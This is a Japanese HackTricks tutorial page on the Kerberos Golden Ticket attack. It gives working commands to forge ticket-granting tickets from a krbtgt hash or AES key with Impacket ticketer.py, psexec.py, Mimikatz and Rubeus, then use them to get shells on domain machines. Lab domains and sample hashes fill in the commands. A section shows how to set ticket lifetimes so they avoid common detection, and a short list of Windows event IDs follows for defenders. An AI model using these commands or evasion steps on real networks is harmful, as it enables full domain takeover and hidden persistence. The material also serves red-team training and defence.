# ゴールデンチケット

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## ゴールデンチケット

**ゴールデンチケット**攻撃は、**NTLMハッシュを使用して任意のユーザーを偽装した正当なチケットグラントチケット（TGT）を作成する**ことから成ります。この技術は、**偽装されたユーザーとしてドメイン内の任意のサービスやマシンにアクセスできる**ため、特に有利です。**krbtgtアカウントの資格情報は自動的に更新されない**ことを覚えておくことが重要です。

krbtgtアカウントの**NTLMハッシュを取得する**ために、さまざまな方法が使用できます。これは、ドメイン内の任意のドメインコントローラー（DC）にある**ローカルセキュリティ機関サブシステムサービス（LSASS）プロセス**または**NTディレクトリサービス（NTDS.dit）ファイル**から抽出できます。さらに、**DCsync攻撃を実行する**ことも、このNTLMハッシュを取得するための別の戦略であり、Mimikatzの**lsadump::dcsyncモジュール**やImpacketの**secretsdump.pyスクリプト**などのツールを使用して実行できます。これらの操作を行うには、**ドメイン管理者権限または同等のアクセスレベルが通常必要**であることを強調することが重要です。

NTLMハッシュはこの目的に対して有効な方法ですが、運用上のセキュリティ理由から、**高度な暗号化標準（AES）Kerberosキー（AES128およびAES256）を使用してチケットを偽造することを強く推奨します**。 

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Windowsから" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**一度** **ゴールデンチケットが注入されると**、共有ファイル **(C$)** にアクセスでき、サービスやWMIを実行できるため、**psexec** や **wmiexec** を使用してシェルを取得できます（winrm経由でシェルを取得することはできないようです）。

### 一般的な検出を回避する

ゴールデンチケットを検出する最も一般的な方法は、**ケルベロストラフィックを検査すること**です。デフォルトでは、Mimikatzは**TGTを10年間署名します**。これは、その後のTGSリクエストで異常として目立ちます。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`、`/endin`、および`/renewmax`パラメータを使用して、開始オフセット、期間、および最大更新回数（すべて分単位）を制御します。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
申し訳ありませんが、TGTの有効期限は4769のログに記録されていないため、この情報はWindowsイベントログには見つかりません。しかし、相関させることができるのは、**前の4768なしで4769を見ること**です。**TGTなしでTGSを要求することは不可能**であり、TGTが発行された記録がない場合、それがオフラインで偽造されたと推測できます。

この検出を**回避するために**、ダイヤモンドチケットを確認してください：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 緩和策

* 4624: アカウントログオン
* 4672: 管理者ログオン
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者ができる他の小さなトリックは、**デフォルトのドメイン管理者アカウントなどの敏感なユーザーのために4769にアラートを出すこと**です。

## 参考文献
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
